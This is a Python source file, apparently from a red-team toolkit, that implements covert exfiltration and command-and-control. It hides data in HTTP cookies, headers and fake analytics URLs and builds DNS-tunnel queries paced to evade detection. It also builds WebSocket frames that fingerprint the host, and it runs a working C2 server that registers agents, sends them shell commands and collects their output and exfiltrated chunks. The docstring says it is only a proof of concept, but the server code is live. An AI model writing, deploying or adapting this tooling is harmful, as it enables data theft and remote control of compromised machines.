"""
C2 (Command & Control) Communication Channels
================================================
Proof-of-concept implementations for covert data channels:
  - HTTP Covert Channel (data in headers/cookies)
  - DNS Tunnel (data encoded as subdomain queries)
  - WebSocket C2 (bidirectional command/response)

These are PoC implementations for Red Team exercises.
They demonstrate that data CAN be exfiltrated — they do NOT
connect to external servers or exfiltrate actual data.
"""

import asyncio
import base64
import json
import random
import struct
import time
from typing import Optional


# ================================================================
# HTTP COVERT CHANNEL
# ================================================================

class HTTPCovertChannel:
    """
    Hide data in legitimate-looking HTTP requests.
    Techniques:
      - Data in Cookie values (base64-encoded chunks)
      - Data in custom headers (X-Request-ID, X-Correlation-ID)
      - Data in User-Agent suffix
      - Data in URL path segments (looks like page IDs)
    """

    def __init__(self, chunk_size: int = 200):
        self.chunk_size = chunk_size
        self.sent_chunks = []

    def encode_for_cookie(self, data: str, cookie_name: str = "session_pref") -> list:
        """Encode data as base64 cookie values."""
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        return [{"Cookie": f"{cookie_name}={chunk}"} for chunk in chunks]

    def encode_for_header(self, data: str) -> list:
        """Encode data in custom request headers."""
        encoded = base64.b64encode(data.encode()).decode()
        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        headers_list = []
        header_names = ["X-Request-ID", "X-Correlation-ID", "X-Trace-ID",
                        "X-Session-Token", "X-Client-Version"]
        for i, chunk in enumerate(chunks):
            header = header_names[i % len(header_names)]
            headers_list.append({header: chunk})
        return headers_list

    def encode_for_url(self, data: str, base_url: str = "/analytics/event") -> list:
        """Encode data as URL path segments that look like analytics events."""
        encoded = base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
        return [f"{base_url}/{chunk}/{random.randint(1000,9999)}" for chunk in chunks]

    def prepare_exfil(self, data: str) -> dict:
        """Prepare full exfiltration plan via HTTP covert channel."""
        return {
            "channel": "http_covert",
            "total_bytes": len(data),
            "cookie_requests": self.encode_for_cookie(data),
            "header_requests": self.encode_for_header(data),
            "url_requests": self.encode_for_url(data),
            "total_requests": (
                len(self.encode_for_cookie(data)) +
                len(self.encode_for_header(data)) +
                len(self.encode_for_url(data))
            ),
        }


# ================================================================
# DNS TUNNEL
# ================================================================

class DNSTunnel:
    """
    Encode data as DNS subdomain queries.
    Each DNS query can carry ~60 bytes of base32-encoded data.

    Format: <chunk_id>.<encoded_data>.c2.example.com
    - chunk_id: 2-char hex sequence number
    - encoded_data: base32-encoded payload (max 60 chars per label)
    - Domain: configurable C2 domain

    PoC only — generates the queries but does NOT send them.
    """

    def __init__(self, c2_domain: str = "c2.redteam.local", label_max: int = 60):
        self.c2_domain = c2_domain
        self.label_max = label_max

    def encode(self, data: str) -> list:
        """Encode data as DNS query list."""
        encoded = base64.b32encode(data.encode()).decode().lower().rstrip("=")
        chunks = [encoded[i:i+self.label_max] for i in range(0, len(encoded), self.label_max)]
        queries = []
        for i, chunk in enumerate(chunks):
            seq = f"{i:02x}"
            query = f"{seq}.{chunk}.{self.c2_domain}"
            queries.append({
                "query": query,
                "type": "TXT",
                "chunk_id": i,
                "data_size": len(chunk),
            })
        return queries

    def decode(self, queries: list) -> str:
        """Decode DNS queries back to original data (for testing)."""
        # Sort by chunk_id
        sorted_q = sorted(queries, key=lambda q: q["chunk_id"])
        encoded = "".join(q["query"].split(".")[1] for q in sorted_q)
        # Pad base32
        padding = (8 - len(encoded) % 8) % 8
        encoded += "=" * padding
        return base64.b32decode(encoded.upper()).decode()

    def prepare_exfil(self, data: str) -> dict:
        """Prepare DNS tunnel exfiltration plan."""
        queries = self.encode(data)
        return {
            "channel": "dns_tunnel",
            "c2_domain": self.c2_domain,
            "total_bytes": len(data),
            "total_queries": len(queries),
            "queries": queries,
            "estimated_time_seconds": len(queries) * 0.5,  # ~2 queries/sec to avoid detection
            "decodable": True,
        }


# ================================================================
# WEBSOCKET C2
# ================================================================

class WebSocketC2:
    """
    Bidirectional C2 channel over WebSocket.

    Protocol:
      Client → Server: {"cmd": "register", "agent_id": "abc123"}
      Server → Client: {"cmd": "exec", "payload": "whoami"}
      Client → Server: {"cmd": "result", "data": "root"}
      Client → Server: {"cmd": "exfil", "data": "<base64>", "chunk": 1, "total": 5}

    PoC only — generates the message frames but does NOT connect.
    """

    def __init__(self, ws_url: str = "ws://c2.redteam.local:8765"):
        self.ws_url = ws_url
        self.agent_id = f"agent-{random.randint(10000, 99999)}"

    def _frame(self, cmd: str, **kwargs) -> dict:
        """Build a C2 protocol frame."""
        return {
            "cmd": cmd,
            "agent_id": self.agent_id,
            "timestamp": time.time(),
            **kwargs,
        }

    def register_frame(self) -> dict:
        """Initial registration frame."""
        import platform
        return self._frame("register",
                           hostname=platform.node(),
                           os=platform.system(),
                           arch=platform.machine())

    def heartbeat_frame(self) -> dict:
        """Periodic heartbeat frame."""
        return self._frame("heartbeat", uptime=time.time())

    def exfil_frames(self, data: str) -> list:
        """Encode data as exfiltration frames."""
        encoded = base64.b64encode(data.encode()).decode()
        chunk_size = 4096  # ~4KB per WS frame
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        return [
            self._frame("exfil", data=chunk, chunk=i, total=len(chunks))
            for i, chunk in enumerate(chunks)
        ]

    def command_result_frame(self, command: str, output: str) -> dict:
        """Response frame for an executed command."""
        return self._frame("result",
                           command=command,
                           output=base64.b64encode(output.encode()).decode(),
                           exit_code=0)

    def prepare_exfil(self, data: str) -> dict:
        """Prepare WebSocket C2 exfiltration plan."""
        frames = self.exfil_frames(data)
        return {
            "channel": "websocket_c2",
            "ws_url": self.ws_url,
            "agent_id": self.agent_id,
            "total_bytes": len(data),
            "total_frames": len(frames) + 2,  # +register +heartbeat
            "protocol": {
                "register": self.register_frame(),
                "heartbeat": self.heartbeat_frame(),
                "exfil_frames": len(frames),
                "sample_frame": frames[0] if frames else None,
            },
        }


# ================================================================
# UNIFIED INTERFACE
# ================================================================

def prepare_c2_exfil(data: str, channel: str = "http") -> dict:
    """
    Prepare data exfiltration via the specified C2 channel.

    Args:
        data: Sensitive data to exfiltrate
        channel: "http" | "dns" | "websocket"

    Returns:
        Channel-specific exfiltration plan with all encoded frames/queries
    """
    if channel == "dns":
        return DNSTunnel().prepare_exfil(data)
    elif channel == "websocket":
        return WebSocketC2().prepare_exfil(data)
    else:
        return HTTPCovertChannel().prepare_exfil(data)


# ================================================================
# C2 SERVER — Real bidirectional WebSocket server
# ================================================================

class C2Server:
    """
    Real WebSocket C2 server for Red Team exercises.
    Runs locally, accepts agent connections, sends commands, receives results.

    Usage:
        server = C2Server(port=9999)
        await server.start()
        await server.send_command("agent-12345", "whoami")
        results = server.get_results("agent-12345")
        await server.stop()
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 9999):
        self.host = host
        self.port = port
        self.agents = {}           # agent_id -> websocket
        self.agent_info = {}       # agent_id -> {hostname, os, ...}
        self.command_queue = {}    # agent_id -> [commands]
        self.results = {}          # agent_id -> [results]
        self._server = None
        self._running = False

    async def _handler(self, websocket):
        """Handle incoming agent connections."""
        agent_id = None
        try:
            async for message in websocket:
                data = json.loads(message)
                cmd = data.get("cmd", "")

                if cmd == "register":
                    agent_id = data.get("agent_id", f"unknown-{id(websocket)}")
                    self.agents[agent_id] = websocket
                    self.agent_info[agent_id] = {
                        "hostname": data.get("hostname", "?"),
                        "os": data.get("os", "?"),
                        "arch": data.get("arch", "?"),
                        "connected_at": time.time(),
                    }
                    self.results.setdefault(agent_id, [])
                    self.command_queue.setdefault(agent_id, [])
                    print(f"  [C2] Agent registered: {agent_id} ({data.get('hostname', '?')})", flush=True)

                    # Send any queued commands
                    while self.command_queue.get(agent_id):
                        cmd_data = self.command_queue[agent_id].pop(0)
                        await websocket.send(json.dumps(cmd_data))

                elif cmd == "heartbeat":
                    if agent_id:
                        self.agent_info[agent_id]["last_heartbeat"] = time.time()

                elif cmd == "result":
                    if agent_id:
                        output = data.get("output", "")
                        if isinstance(output, str) and output.startswith("base64:"):
                            output = base64.b64decode(output[7:]).decode("utf-8", errors="replace")
                        self.results[agent_id].append({
                            "command": data.get("command", "?"),
                            "output": output,
                            "exit_code": data.get("exit_code", -1),
                            "timestamp": time.time(),
                        })
                        print(f"  [C2] Result from {agent_id}: {data.get('command', '?')[:50]}", flush=True)

                elif cmd == "exfil":
                    if agent_id:
                        chunk_data = data.get("data", "")
                        chunk_id = data.get("chunk", 0)
                        total = data.get("total", 1)
                        self.results[agent_id].append({
                            "type": "exfil",
                            "chunk": chunk_id,
                            "total": total,
                            "data_size": len(chunk_data),
                            "timestamp": time.time(),
                        })

        except Exception as e:
            print(f"  [C2] Agent disconnected: {agent_id} ({e})", flush=True)
        finally:
            if agent_id and agent_id in self.agents:
                del self.agents[agent_id]

    async def start(self):
        """Start the C2 server."""
        try:
            import websockets
            self._server = await websockets.serve(self._handler, self.host, self.port)
            self._running = True
            print(f"  [C2] Server started on ws://{self.host}:{self.port}", flush=True)
        except ImportError:
            print("  [C2] websockets package not installed. Run: pip install websockets", flush=True)
            self._running = False

    async def stop(self):
        """Stop the C2 server."""
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._running = False
            print("  [C2] Server stopped", flush=True)

    async def send_command(self, agent_id: str, command: str) -> bool:
        """Send a command to a connected agent."""
        if agent_id in self.agents:
            try:
                await self.agents[agent_id].send(json.dumps({
                    "cmd": "exec", "payload": command, "timestamp": time.time(),
                }))
                return True
            except Exception:
                return False
        else:
            # Queue for when agent connects
            self.command_queue.setdefault(agent_id, []).append({
                "cmd": "exec", "payload": command, "timestamp": time.time(),
            })
            return False

    def get_results(self, agent_id: str) -> list:
        """Get all results from an agent."""
        return self.results.get(agent_id, [])

    def list_agents(self) -> dict:
        """List all connected agents."""
        return {
            aid: {**info, "connected": aid in self.agents}
            for aid, info in self.agent_info.items()
        }

    def status(self) -> dict:
        """Get C2 server status."""
        return {
            "running": self._running,
            "address": f"ws://{self.host}:{self.port}",
            "agents_connected": len(self.agents),
            "agents_total": len(self.agent_info),
            "total_results": sum(len(r) for r in self.results.values()),
        }
